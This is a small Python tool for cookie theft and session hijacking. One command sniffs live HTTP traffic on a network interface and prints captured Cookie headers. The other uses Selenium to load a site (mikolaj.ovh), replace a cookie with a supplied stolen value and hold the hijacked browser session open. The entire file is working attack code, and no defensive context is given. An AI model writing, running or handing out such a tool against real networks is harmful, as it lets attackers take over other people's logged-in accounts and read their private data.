import click
import pyshark
import time

from selenium import webdriver


BROWSER_DRIVERS = {
    'opera': webdriver.Opera,
    'chrome': webdriver.Chrome
}


@click.command()
@click.option('-t', '--time', default=10)
@click.option('-i', '--interface', default='en1')
def sniff(time, interface):
    capture = pyshark.LiveCapture(interface=interface, display_filter='http')
    click.secho('[INFO] Capturing for {}s'.format(time), fg='blue')
    capture.sniff(timeout=time)
    click.secho('[INFO] Captured {} packets'.format(len(capture)), fg='blue')

    packe_len = len(capture)

    for i in range(packe_len):
        try:
            click.secho(capture[i].http.cookie, fg='green')
        except AttributeError:
            pass

    capture.close()



@click.command()
@click.option('-c', '--cookie')
@click.option('-b', '--browser', default='opera')
def switch_cookie(cookie, browser):
    name, value = cookie.split('=')

    driver = BROWSER_DRIVERS[browser]()
    click.secho('[INFO] Running browser:', fg='blue')
    driver.get("http://www.mikolaj.ovh")

    click.secho('[INFO] Old cookies:', fg='blue')
    for cookie in driver.get_cookies():
        click.secho(
                'name: {} value: {}'.format(cookie['name'], cookie['value']),
                fg='yellow'
            )

    driver.delete_cookie(name)

    driver.add_cookie(
        {'name': name, 'value': value}
        )

    click.secho('[INFO] New cookies:', fg='blue')
    for cookie in driver.get_cookies():
        click.secho(
                'name: {} value: {}'.format(cookie['name'], cookie['value']),
                fg='yellow'
            )

    try:
        while True:
            driver.execute_script("")
            time.sleep(0.2)

    except:
        has_quit = False
        while not has_quit:
            try:
                driver.quit()
                has_quit = True
            except:
                pass


if __name__ == '__main__':
    switch_cookie()